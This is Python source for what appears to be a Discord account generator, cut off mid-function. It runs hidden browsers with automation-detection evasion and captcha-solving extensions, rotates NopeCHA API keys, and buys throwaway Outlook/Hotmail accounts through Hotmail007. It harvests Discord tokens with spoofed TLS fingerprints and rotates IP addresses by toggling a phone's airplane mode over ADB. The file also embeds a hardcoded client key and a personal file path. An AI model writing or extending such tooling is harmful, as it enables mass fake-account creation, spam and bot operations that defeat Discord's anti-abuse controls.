

import asyncio
from datetime import datetime
import hashlib
import os
import shutil
from pathlib import Path
import platform
import re
import sys
import threading
import time
import json
import random
import string
import signal
import tempfile
from typing import Optional, Dict
import requests
import httpx
import tls_client
from colorama import Fore, Style, init
from pystyle import Center, Colorate, Colors
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.text import Text
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
import warnings
import truedriver as uc
from truedriver import cdp
import urllib3
import base64
import subprocess
import concurrent.futures
import ctypes
import msvcrt

# ============================================================================
# CDP KEY SENDER — works headless, targets only the Brave/Chrome window
# ============================================================================

async def _cdp_key(tab, key: str, code: str, keycode: int):
    """Send a single keydown+keyup via CDP to a specific tab — no pyautogui needed."""
    try:
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyDown", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
        await asyncio.sleep(0.05)
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyUp", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
    except Exception:
        pass

# ============================================================================
# BRAVE BROWSER PATH
# ============================================================================

def get_brave_path() -> Optional[str]:
    """Find Brave browser executable on Windows/Mac/Linux."""
    paths = [
        # Windows
        r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe"),
        # macOS
        "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser",
        # Linux
        "/usr/bin/brave-browser",
        "/usr/bin/brave",
        "/snap/bin/brave",
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

BRAVE_PATH = get_brave_path()

# ============================================================================
# NOPECHA AUTO-INSTALLER
# ============================================================================

NOPECHA_PROFILE = Path(__file__).parent / "nopecha_profile"
NOPECHA_EXT_ID  = "dknlfmjaanfblgfdfebhijalfmhmjjjo"
NOPECHA_STORE   = f"https://chromewebstore.google.com/detail/nopecha-captcha-solver/{NOPECHA_EXT_ID}"
NOPECHA_EXT_DIR = Path(__file__).parent / "nopecha_ext"
NOPECHA_KEYS_FILE = Path(__file__).parent / "nopecha_keys.txt"

# The browser started for NopeCHA — reused by workers
NOPECHA_BROWSER  = None
NOPECHA_KEY_INDEX = 0  # current key index

def load_nopecha_keys() -> list:
    """Load NopeCHA API keys from nopecha_keys.txt (one per line)."""
    if not NOPECHA_KEYS_FILE.exists():
        # Create empty file with instructions
        NOPECHA_KEYS_FILE.write_text(
            "# Add your NopeCHA API keys here, one per line\n"
            "# Get keys from https://nopecha.com/setup\n"
            "# Each key gets 100 free solves\n"
        )
        return []
    keys = []
    for line in NOPECHA_KEYS_FILE.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            keys.append(line)
    return keys

def get_current_nopecha_key() -> Optional[str]:
    """Get the current NopeCHA key based on rotation index."""
    keys = load_nopecha_keys()
    if not keys:
        return None
    return keys[NOPECHA_KEY_INDEX % len(keys)]

def rotate_nopecha_key():
    """Move to the next NopeCHA key."""
    global NOPECHA_KEY_INDEX
    keys = load_nopecha_keys()
    if keys:
        NOPECHA_KEY_INDEX = (NOPECHA_KEY_INDEX + 1) % len(keys)
        log.info(f"Rotated to NopeCHA key #{NOPECHA_KEY_INDEX + 1}/{len(keys)}")

def inject_nopecha_key(api_key: str):
    """
    Write the API key directly into the NopeCHA extension's settings JSON
    so the extension uses it without needing to open any UI.
    """
    if not api_key or not NOPECHA_EXT_DIR.exists():
        return

    # NopeCHA stores settings in manifest/settings.json or localStorage backup
    # We write to a settings file the extension reads on startup
    settings_path = NOPECHA_EXT_DIR / "settings.json"
    try:
        settings = {}
        if settings_path.exists():
            with open(settings_path, 'r') as f:
                settings = json.load(f)
        settings['key'] = api_key
        with open(settings_path, 'w') as f:
            json.dump(settings, f)
    except Exception as e:
        log.warning(f"Could not inject NopeCHA key: {e}")

def download_nopecha_ext() -> Optional[Path]:
    """
    Download NopeCHA CRX directly from Google's update server and extract it.
    Returns the extracted extension folder path, or None on failure.
    No browser dialog — no clicking needed.
    """
    if NOPECHA_EXT_DIR.exists() and (NOPECHA_EXT_DIR / "manifest.json").exists():
        return NOPECHA_EXT_DIR

    import zipfile
    log.info("Downloading NopeCHA extension...")

    crx_url = (
        "https://clients2.google.com/service/update2/crx"
        "?response=redirect&prodversion=120.0.0.0"
        f"&acceptformat=crx2,crx3&x=id%3D{NOPECHA_EXT_ID}%26uc"
    )

    try:
        r = requests.get(crx_url, timeout=30, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        if r.status_code != 200:
            log.warning(f"CRX download failed: HTTP {r.status_code}")
            return None

        data = r.content

        # Strip CRX3 header to get the ZIP payload
        if data[:4] == b"Cr24":
            version = int.from_bytes(data[4:8], "little")
            if version == 3:
                header_size = int.from_bytes(data[8:12], "little")
                zip_start   = 12 + header_size
            else:
                pub_len = int.from_bytes(data[8:12],  "little")
                sig_len = int.from_bytes(data[12:16], "little")
                zip_start = 16 + pub_len + sig_len
        else:
            zip_start = 0

        NOPECHA_EXT_DIR.mkdir(exist_ok=True)
        import io
        with zipfile.ZipFile(io.BytesIO(data[zip_start:])) as z:
            z.extractall(NOPECHA_EXT_DIR)

        log.success(f"NopeCHA downloaded and extracted!")
        return NOPECHA_EXT_DIR

    except Exception as e:
        log.warning(f"NopeCHA download error: {e}")
        return None


def nopecha_is_installed() -> bool:
    return NOPECHA_EXT_DIR.exists() and (NOPECHA_EXT_DIR / "manifest.json").exists()


async def setup_nopecha():
    """
    Download NopeCHA CRX (once), inject current API key, start browser.
    Browser runs off-screen — invisible to the user but extensions still work.
    """
    global NOPECHA_BROWSER

    NOPECHA_PROFILE.mkdir(exist_ok=True)

    # Download extension if not present
    ext_path = download_nopecha_ext()

    # Inject current API key into extension
    current_key = get_current_nopecha_key()
    if current_key:
        inject_nopecha_key(current_key)
    else:
        log.warning("No NopeCHA keys in nopecha_keys.txt — captcha auto-solve disabled")

    browser_args = [
        f'--user-data-dir={NOPECHA_PROFILE}',
        '--no-first-run',
        '--disable-default-apps',
        '--disable-blink-features=AutomationControlled',
        '--disable-dev-shm-usage',
        '--no-sandbox',
        '--disable-web-security',
        '--disable-features=IsolateOrigins,site-per-process',
        # Move window completely off-screen — invisible but extensions still load
        '--window-size=1280,720',
        '--window-position=-32000,-32000',
        '--silent-debugger-extension-api',
        '--log-level=3',           # suppress Chrome console output
        '--disable-logging',
        '--disable-infobars',
        '--disable-notifications',
        '--mute-audio',
    ]

    if ext_path:
        browser_args.append(f'--load-extension={ext_path}')
        browser_args.append(f'--disable-extensions-except={ext_path}')

    NOPECHA_BROWSER = await uc.start(
        headless=False,
        browser_executable_path=BRAVE_PATH if BRAVE_PATH else None,
        browser_args=browser_args,
    )

    await asyncio.sleep(2)
    log.success("captcha solver ready")


async def create_browser(thread_id: int = 0):
    """Create a per-thread browser instance, off-screen and taskbar-hidden.
    Each thread gets its own extension copy so NopeCHA keys don't collide."""
    import shutil as _shutil

    # Download base extension once
    base_ext = download_nopecha_ext()

    # Copy extension to a per-thread directory so each browser has isolated storage
    thread_ext_dir = NOPECHA_EXT_DIR.parent / f"nopecha_ext_{thread_id}"
    if not thread_ext_dir.exists() or not (thread_ext_dir / "manifest.json").exists():
        if base_ext and base_ext.exists():
            if thread_ext_dir.exists():
                _shutil.rmtree(thread_ext_dir)
            _shutil.copytree(str(base_ext), str(thread_ext_dir))

    # Assign key by thread_id so each thread uses a different key (no competition)
    keys = load_nopecha_keys()
    if keys:
        current_key = keys[(thread_id - 1) % len(keys)]
    else:
        current_key = None

    if current_key and thread_ext_dir.exists():
        settings_path = thread_ext_dir / "settings.json"
        try:
            settings = {}
            if settings_path.exists():
                with open(settings_path, 'r') as f:
                    settings = json.load(f)
            settings['key'] = current_key
            with open(settings_path, 'w') as f:
                json.dump(settings, f)
        except Exception:
            pass

    ext_path = thread_ext_dir if thread_ext_dir.exists() else base_ext

    # Each thread gets its own profile directory
    profile_dir = NOPECHA_PROFILE.parent / f"nopecha_profile_{thread_id}"
    profile_dir.mkdir(exist_ok=True)

    browser_args = [
        f'--user-data-dir={profile_dir}',
        '--no-first-run',
        '--disable-default-apps',
        '--disable-blink-features=AutomationControlled',
        '--disable-dev-shm-usage',
        '--no-sandbox',
        '--disable-web-security',
        '--disable-features=IsolateOrigins,site-per-process',
        '--window-size=1280,720',
        '--window-position=-32000,-32000',
        '--silent-debugger-extension-api',
        '--log-level=3',
        '--disable-logging',
        '--disable-infobars',
        '--disable-notifications',
        '--mute-audio',
        '--app=about:blank',
    ]

    if ext_path:
        browser_args.append(f'--load-extension={ext_path}')
        browser_args.append(f'--disable-extensions-except={ext_path}')

    browser = await uc.start(
        headless=False,
        browser_executable_path=BRAVE_PATH if BRAVE_PATH else None,
        browser_args=browser_args,
    )
    await asyncio.sleep(2)

    # Set NopeCHA key via extension storage API after browser starts
    if current_key:
        try:
            page = await browser.get(f"chrome-extension://{NOPECHA_EXT_ID}/setup.html")
            await asyncio.sleep(1)
            await page.evaluate(f"""
                chrome.storage.local.set({{key: '{current_key}'}});
            """)
            await asyncio.sleep(0.5)
        except Exception:
            pass

    return browser


async def get_nopecha_page():
    """Navigate the existing NopeCHA browser to Discord register and return the page."""
    for attempt in range(5):
        try:
            page = await NOPECHA_BROWSER.get("https://discord.com/register")
            return page
        except StopIteration:
            await asyncio.sleep(2)
        except Exception as e:
            await asyncio.sleep(2)
    return None


async def get_browser_page(browser, url: str = "https://discord.com/register"):
    """Navigate a browser instance to a URL and return the page."""
    for attempt in range(5):
        try:
            page = await browser.get(url)
            return page
        except StopIteration:
            await asyncio.sleep(2)
        except Exception:
            await asyncio.sleep(2)
    return None


# Groq (kept for optional use)
try:
    from groq import Groq
    GROQ_AVAILABLE = True
except ImportError:
    GROQ_AVAILABLE = False

# Try to import psutil for process management (optional)
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings and suppress nodriver connection errors
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', category=ResourceWarning)
warnings.filterwarnings('ignore', message='.*connection.*refused.*')
warnings.filterwarnings('ignore', message='.*Task exception was never retrieved.*')

# Suppress asyncio errors in console
import logging
logging.getLogger('asyncio').setLevel(logging.CRITICAL)
logging.getLogger('websockets').setLevel(logging.CRITICAL)
logging.getLogger('truedriver').setLevel(logging.CRITICAL)

# ============================================================================
# DISCORD TOKEN FETCH FUNCTION
# ============================================================================

async def fetch_discord_token(email: str, password: str) -> str:
    url = "https://discord.com/api/v9/auth/login"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://discord.com",
        "priority": "u=1, i",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "x-discord-timezone": "Asia/Calcutta",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM4NDg4NywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }
    
    payload = {
        "gift_code_sku_id": None,
        "login": email,
        "login_source": None,
        "password": password,
        "undelete": False,
    }
    
    session = tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)
    try:
        response = session.post(url, headers=headers, json=payload)
        print(f"Succesfully Fetched Token -> {email}")
        timestamp = datetime.now().strftime("%H:%M:%S")
        if response.status_code != 200:
            return ""
        response_data = response.json()
        token = response_data.get("token")
        if not token:
            return ""
        return token
    except:
        return ""


# ============================================================================
# JAVASCRIPT UTILITIES
# ============================================================================

JS_UTILS = '''
(() => {
    if (window.utils) return; // Already injected
    
    function setInput(selector, value) {
        const el = document.querySelector(selector);
        if (el) {
            el.value = value;
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
        }
    }
    
    function clickAllCheckboxes() {
        const checkboxes = document.querySelectorAll('input[type="checkbox"]');
        let clicked = 0;
        checkboxes.forEach(cb => {
            if (!cb.checked) {
                cb.click();
                cb.checked = true;
                cb.dispatchEvent(new Event('change', { bubbles: true }));
                clicked++;
            }
        });
        return { clicked: clicked, total: checkboxes.length };
    }
    
    function clickElement(selector) {
        const el = document.querySelector(selector);
        if (el) el.click();
    }
    
    function setDropdown(label, value) {
        const dropdown = document.querySelector(`div[role="button"][aria-label="${label}"]`);
        if (!dropdown) return;
        
        dropdown.click();
        
        setTimeout(() => {
            const options = document.querySelectorAll('div[role="option"]');
            const match = Array.from(options).find(opt => opt.textContent.trim() === value);
            if (match) match.click();
        }, 100);
    }
    
    function waitForDiscordToken(timeout = 5000) {
        return new Promise((resolve) => {
            const start = Date.now();
            const check = () => {
                const token = localStorage.getItem('token');
                if (token) {
                    resolve(token.replace(/^"|"$/g, ''));
                } else if (Date.now() - start < timeout) {
                    setTimeout(check, 200);
                } else {
                    resolve(null);
                }
            };
            check();
        });
    }
    
    function findCaptchaFrame() {
        const iframes = document.querySelectorAll('iframe');
        for (let iframe of iframes) {
            const src = iframe.src || '';
            if (src.includes('captcha') || src.includes('hcaptcha') || src.includes('recaptcha')) {
                return iframe;
            }
        }
        return null;
    }
    
    window.utils = {
        setInput,
        clickAllCheckboxes,
        clickElement,
        setDropdown,
        waitForDiscordToken,
        findCaptchaFrame
    };
})();
'''

# ============================================================================
# CONFIGURATION & GLOBALS
# ============================================================================

console = Console()
LOCK = threading.Lock()
SCRIPT_DIR = Path(__file__).parent
MS_CLIENT_ID = "d8fbe69d-15be-43fa-b204-5c5bc5a73ad7"  # Default Microsoft client ID

# Session counters (set at runtime by main)
SESSION_TARGET = 0          # 0 = infinite
SESSION_CREATED = 0         # accounts successfully created this session
SESSION_STOP = False        # signal workers to stop

# Global Status Counters
TOTAL_VALID = 0
TOTAL_LOCKED = 0
TOTAL_INVALID = 0

# Load config
config_path = Path(__file__).parent / 'input' / 'config.json'

if config_path.exists():
    with open(config_path, 'r', encoding='utf-8') as f:
        config = json.load(f)
    # ── Patch missing keys from older config versions ──────────
    config.setdefault("email_api", {})
    config["email_api"].setdefault("hotmail007", {"client_key": "", "auto_buy": True})
    config["email_api"]["hotmail007"].setdefault("client_key", "")
    config["email_api"]["hotmail007"].setdefault("auto_buy", True)
    config["email_api"].setdefault("cybertemp", {"enabled": False, "api_key": ""})
    config["email_api"]["cybertemp"].setdefault("enabled", False)
    config["email_api"]["cybertemp"].setdefault("api_key", "")
    config["email_api"].setdefault("hotmail_pool", {"enabled": False, "file": "input/mails.json"})
    config["email_api"]["hotmail_pool"].setdefault("enabled", False)
    config["email_api"]["hotmail_pool"].setdefault("file", "input/mails.json")
    config.setdefault("proxy", {"enabled": False, "file": "input/proxies.txt"})
    config.setdefault("adb", {"path": r"C:\Users\roy10\Downloads\platform-tools-latest-windows\platform-tools\adb.exe"})
else:
    config = {
        "Threads": 1,
        "Humanize": False,
        "CustomizationSettings": {
            "Bio": False,
            "Avatar": False
        },
        "ai_api": {
            "groq": {
                "api_key": "",
                "model": "llama-3.3-70b-versatile"
            },
            "gemini": {
                "api_key": "",
                "model": "gemini-1.5-flash"
            }
        },
        "email_api": {
            "hotmail007": {
                "client_key": "8f91601f19da48fa8e1f4485280d27ee018119",
                "auto_buy": True
            },
            "cybertemp": {
                "enabled": True,
                "api_key": ""
            },
            "hotmail_pool": {
                "enabled": False,
                "file": "input/mails.json"
            }
        },
        "proxy": {
            "enabled": False,
            "file": "input/proxies.txt"
        },
        "adb": {
            "path": r"C:\Users\roy10\Downloads\platform-tools-latest-windows\platform-tools\adb.exe"
        }
    }
    # Save default config
    config_path.parent.mkdir(exist_ok=True)
    with open(config_path, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=4)
    print(f"[DEBUG] Default config saved to {config_path}")


# Output directory
OUTPUT_DIR = Path(__file__).parent / 'output'
OUTPUT_DIR.mkdir(exist_ok=True)

# ============================================================================
# LOGGER
# ============================================================================

# Windows: enable ANSI color codes
if sys.platform == 'win32':
    import ctypes
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass

# ── Color palette ─────────────────────────────────────────────────────────────
GRAY      = '\033[90m'
GREEN     = '\033[92m'
RED       = '\033[91m'
DARK_RED  = '\033[31m'
YELLOW    = '\033[93m'
WHITE     = '\033[97m'
RESET     = '\033[0m'
PINK      = '\033[95m'
CYAN      = '\033[96m'
BLUE      = '\033[94m'
MAGENTA   = '\033[35m'
PURPLE    = '\033[35m'
DIM       = '\033[2m'
BOLD      = '\033[1m'

# ── Helpers ────────────────────────────────────────────────────────────────────
def _w(text: str):
    """Write to stdout without newline."""
    sys.stdout.write(text)
    sys.stdout.flush()

def print_header(title: str):
    """Thin accent header — matches the event log style."""
    print(f"\n  {CYAN}{BOLD}{title}{RESET}  {GRAY}{'·' * max(0, 42 - len(title))}{RESET}")

# ── Boot animation ─────────────────────────────────────────────────────────────
async def boot_sequence():
    """Minimal — just a short pause so the banner is readable."""
    await asyncio.sleep(0.3)

class Logger:
    """[SoliderX]-style logger."""

    def __init__(self):
        self._captcha_start = 0.0

    @staticmethod
    def _tag(color, tag, message):
        sys.stdout.write(
            f'  {CYAN}[SoliderX]{RESET}   {color}{tag.upper():<12}{RESET} {GRAY}|{RESET}  {message}{RESET}\n'
        )
        sys.stdout.flush()

    @staticmethod
    def thread_header(thread_id, proxy=None):
        sep = '  ' + GRAY + '-'*54 + RESET
        px = f"  {GRAY}proxy: {CYAN}{proxy}{RESET}" if proxy else ""
        sys.stdout.write(f"\n  {MAGENTA}THREAD {thread_id}{RESET}{px}\n")
        sys.stdout.flush()

    def info(self, msg):    self._tag(CYAN,   'INFO',    f'{WHITE}{msg}')
    def success(self, msg): self._tag(GREEN,  'OK',      f'{WHITE}{msg}')
    def warning(self, msg): self._tag(YELLOW, 'WARN',    f'{GRAY}{msg}')
    def error(self, msg):   self._tag(RED,    'ERROR',   f'{WHITE}{msg}')
    def debug(self, msg):   pass

    def question(self, msg):
        sys.stdout.write(f'\n  {CYAN}?{RESET}  {WHITE}{msg}{RESET}  ')
        sys.stdout.flush()

    def mask_token(self, token):
        return token[:22] + '...' if len(token) > 22 else token

    def email_got(self, email):
        self._tag(CYAN,   'EMAIL',    f'{WHITE}{email}')

    def register_page(self):
        pass

    def filled_info(self):
        self._tag(CYAN,   'REGISTER', f'{WHITE}form submitted')

    def solving_captcha(self):
        self._tag(YELLOW, 'SOLVING',  f'{WHITE}NopeCHA  >  waiting...')
        self._captcha_start = time.time()

    def captcha_solved(self, answer=''):
        t = round(time.time() - self._captcha_start, 1)
        self._tag(GREEN,  'CAPTCHA',  f'{WHITE}Solved  {GRAY}({t}s)')

    def verified_mail(self):
        self._tag(GREEN,  'VERIFY',   f'{WHITE}email verified')

    def token_got(self, token):
        self._tag(GREEN,  'TOKEN',    f'{WHITE}{self.mask_token(token)}')

    def token_status(self, status):
        if status == 'VALID':
            self._tag(GREEN,  'STATUS',   f'{GREEN}Valid')
        elif status == 'LOCKED':
            self._tag(YELLOW, 'STATUS',   f'{YELLOW}Locked')
        else:
            self._tag(RED,    'STATUS',   f'{RED}Invalid')

    def status_bar(self):
        with LOCK:
            v, l, i = TOTAL_VALID, TOTAL_LOCKED, TOTAL_INVALID
        total = v + l + i
        sep = f"  {GRAY}{'-' * 54}{RESET}"
        tgt = f"/{SESSION_TARGET}" if SESSION_TARGET > 0 else ""
        print(sep)
        print(f"  {GREEN}valid {v}{RESET}  {YELLOW}locked {l}{RESET}  {RED}failed {i}{RESET}   {GRAY}total {WHITE}{total}{tgt}{RESET}")
        print(sep)
log = Logger()

# PROXY HANDLER
# ============================================================================

def load_proxies(config: dict) -> list:
    """Load proxies from file"""
    proxy_enabled = config.get("proxy", {}).get("enabled", False)
    if not proxy_enabled:
        return []
    
    proxy_file = config.get("proxy", {}).get("file", "input/proxies.txt")
    proxy_path = Path(proxy_file)
    
    if not proxy_path.exists():
        log.warning(f"Proxy file not found: {proxy_file}")
        log.info(f"Create file at: {proxy_path.absolute()}")
        return []
    
    try:
        with open(proxy_path, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
        
        if proxies:
            log.success(f"Loaded {len(proxies)} proxies from {proxy_file}")
            for i, p in enumerate(proxies, 1):
                log.info(f"  Proxy {i}: {p}")
            return proxies
        else:
            log.warning("Proxy file is empty")
            return []
    except Exception as e:
        log.error(f"Error loading proxies: {e}")
        return []


def get_random_proxy(proxies: list) -> str:
    """Get a random proxy from the list"""
    if not proxies:
        return None
    return random.choice(proxies)

# ============================================================================
# ADB MANAGER (PORTED)
# ============================================================================

class ADBManager:
    def __init__(self, adb_path="adb"):
        self.adb_path = adb_path
        self.device_id = None

    def _run_cmd(self, args, timeout=5):
        """Internal helper to run adb commands."""
        try:
            full_args = [self.adb_path]
            if self.device_id:
                full_args += ["-s", self.device_id]
            full_args += args
            
            result = subprocess.run(full_args, capture_output=True, text=True, check=False, timeout=timeout)
            return result.stdout.strip(), result.returncode
        except subprocess.TimeoutExpired:
            log.warning(f"ADB command timed out after {timeout}s: {' '.join(args)}")
            return "TIMEOUT", 1
        except Exception as e:
            return str(e), 1

    def find_devices(self):
        """Detect connected ADB devices with a generous timeout for server startup."""
        stdout, _ = self._run_cmd(["devices"], timeout=15)
        lines = stdout.splitlines()
        devices = []
        for line in lines[1:]:
            if line.strip() and "device" in line and "attached" not in line:
                devices.append(line.split()[0])
        
        if devices:
            self.device_id = devices[0]
            return devices
        return []

    def is_airplane_mode_on(self):
        """Check current airplane mode state from the device."""
        stdout, _ = self._run_cmd(["shell", "settings", "get", "global", "airplane_mode_on"], timeout=3)
        return stdout.strip() == "1"

    async def _set_airplane_mode(self, enable: bool):
        """Internal helper to set airplane mode using multiple fallback methods."""
        target = "1" if enable else "0"
        state_bool = "true" if enable else "false"
        cmd_arg = "enable" if enable else "disable"

        log.debug(f"Setting Airplane Mode to {enable}...")

        # Method 1: Modern Android 'cmd' (Fastest & most reliable on Android 12+)
        self._run_cmd(["shell", "cmd", "connectivity", "airplane-mode", cmd_arg], timeout=3)
        
        # Propagation Delay: Critical for the system setting to update
        await asyncio.sleep(1.5)
        
        # Check if it worked
        if self.is_airplane_mode_on() == enable:
            log.debug(f"Method 1 (cmd) succeeded ({enable})")
            return True

        # Method 2: Legacy 'settings put' + 'am broadcast' (Android 4 - 11)
        self._run_cmd(["shell", "settings", "put", "global", "airplane_mode_on", target], timeout=3)
        self._run_cmd(["shell", "am", "broadcast", "-a", "android.intent.action.AIRPLANE_MODE", "--ez", "state", state_bool], timeout=5)
        
        await asyncio.sleep(0.5)
        if self.is_airplane_mode_on() == enable:
            log.debug(f"Method 2 (settings) succeeded ({enable})")
            return True

        # Method 3: Emergency Fallback
        log.warning(f"Standard airplane mode commands failed. Using direct radio reset fallback...")
        self._run_cmd(["shell", "svc", "data", "disable" if enable else "enable"], timeout=3)
        self._run_cmd(["shell", "svc", "wifi", "disable" if enable else "enable"], timeout=3)
        
        return False

    async def toggle_airplane_mode(self, delay=5):
        """Universal Airplane Mode toggle for IP rotation."""
        if not self.device_id:
            return False, "No device connected"

        # 1. Turn ON
        log.info("Turning Airplane Mode ON...")
        await self._set_airplane_mode(True)
        
        # Wait for tower to drop connection (Higher delay = better IP rotation success)
        rotation_delay = 8
        log.info(f"Waiting {rotation_delay}s for network disconnect...")
        await asyncio.sleep(rotation_delay)
        
        # 2. Turn OFF
        log.info("Turning Airplane Mode OFF...")
        await self._set_airplane_mode(False)
        
        # Triple-check the state and FORCE off if stuck
        await asyncio.sleep(1)
        if self.is_airplane_mode_on():
            log.warning("Device stuck in Airplane Mode! Forcing recovery...")
            self._run_cmd(["shell", "cmd", "connectivity", "airplane-mode", "disable"], timeout=3)
            self._run_cmd(["shell", "settings", "put", "global", "airplane_mode_on", "0"], timeout=3)
            self._run_cmd(["shell", "am", "broadcast", "-a", "android.intent.action.AIRPLANE_MODE", "--ez", "state", "false"], timeout=3)
        
        return True, "Airplane mode toggle cycle finished"

    async def wait_for_internet(self, timeout=60):
        """Wait until internet connection is restored."""
        start = time.time()
        while time.time() - start < timeout:
            try:
                async with httpx.AsyncClient() as client:
                    resp = await client.get("https://api.ipify.org?format=json", timeout=5)
                    if resp.status_code == 200:
                        return resp.json().get("ip")
            except:
                pass
            await asyncio.sleep(2)
        return None

    async def rotate_ip(self):
        """Full rotation cycle."""
        log.info("Starting IP Rotation via ADB...")
        
        # Check current IP if possible (to verify it actually changed later)
        old_ip = await self.wait_for_internet(timeout=10)
        if old_ip:
            log.info(f"Current IP: {old_ip}")
        
        success, msg = await self.toggle_airplane_mode(delay=6)
        if not success:
            log.error(f"ADB Toggle failed: {msg}")
            return None

        log.info("Waiting for internet reconnection...")
        new_ip = await self.wait_for_internet(timeout=60)
        
        if new_ip:
            if new_ip == old_ip:
                log.warning(f"Network reset, but IP remains the same: {new_ip}")
            else:
                log.success(f"IP rotated successfully! New IP: {new_ip}")
            return new_ip
        else:
            log.error("Timed out waiting for connection. Check your phone's data connection.")
            return None

# ============================================================================
# JAVASCRIPT HELPER CLASS
# ============================================================================

class JsHelper:
    _injected = set()
    
    @staticmethod
    def setup(page):
        """Inject JS utilities into page"""
        page_id = id(page)
        if page_id in JsHelper._injected:
            return
        try:
            page.evaluate(JS_UTILS)
            JsHelper._injected.add(page_id)
        except Exception as e:
            log.warning(f"JS inject error: {e}")
    
    @staticmethod
    def set_input(page, selector: str, value: str):
        """Set input value using JS"""
        value_escaped = value.replace('\\', '\\\\').replace('"', '\\"')
        selector_escaped = selector.replace('\\', '\\\\').replace('"', '\\"')
        page.evaluate(f'window.utils.setInput("{selector_escaped}", "{value_escaped}")')
    
    @staticmethod
    def click_all_checkboxes(page):
        """Click all checkboxes using JS"""
        return page.evaluate('window.utils.clickAllCheckboxes()')
    
    @staticmethod
    def click_element(page, selector: str):
        """Click element using JS"""
        selector_escaped = selector.replace('\\', '\\\\').replace('"', '\\"')
        page.evaluate(f'window.utils.clickElement("{selector_escaped}")')
    
    @staticmethod
    def find_captcha_frame(page):
        """Find captcha iframe using JS"""
        return page.evaluate('window.utils.findCaptchaFrame()')
    
    @staticmethod
    def wait_for_token(page, timeout: int = 5000):
        """Wait for Discord token in localStorage"""
        try:
            return page.evaluate(f'window.utils.waitForDiscordToken({timeout})')
        except:
            return None

# ============================================================================
# HOTMAIL007 EMAIL API
# ============================================================================

class Hotmail007API:
    """Hotmail007 API - CORRECT ENDPOINT STRUCTURE"""
    
    def __init__(self, client_key: str):
        self.session = requests.Session()
        self.session.verify = False  # Disable SSL verification
        self.client_key = client_key
        self.base_url = "https://api.hotmail007.com"
        self.mail_types = ["outlook", "hotmail"]
    
    def _fetch_email(self, mail_type: str) -> dict:
        """Internal method to fetch email of specific type"""
        url = f"{self.base_url}/api/mail/getMail"
        params = {
            "clientKey": self.client_key,
            "mailType": mail_type,
            "quantity": 1
        }
        try:
            resp = self.session.get(url, params=params, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("success") and data.get("code") == 0 and "data" in data:
                    accounts = data["data"]
                    if accounts:
                        parts = accounts[0].split(":")
                        if len(parts) >= 4:
                            return {
                                "success": True,
                                "email": parts[0],
                                "password": parts[1],
                                "token": parts[2],
                                "uuid": parts[3] if parts[3] else ""
                            }
        except Exception as e:
            pass
        return {"success": False}
    
    def buy_email(self, max_retries: int = 10) -> dict:
        """
        Purchase email with auto-retry (tries outlook and hotmail)
        Retries for up to 20 seconds
        Returns: {"success": True, "email": "xxx@outlook.com", "password": "xxx"}
        """
        if not self.client_key:
            log.error("Missing hotmail007 client_key in config")
            return {"success": False, "error": "Missing client_key"}
        
        log.info("Purchasing email from Hotmail007...")
        start_time = time.time()
        timeout = 20  # 20 seconds total timeout
        attempt = 0
        
        while (time.time() - start_time) < timeout:
            attempt += 1
            for mail_type in self.mail_types:
                log.info(f"Attempt {attempt}: Trying {mail_type}...")
                account = self._fetch_email(mail_type)
                if account.get("success"):
                    email = account.get("email")
                    password = account.get("password")
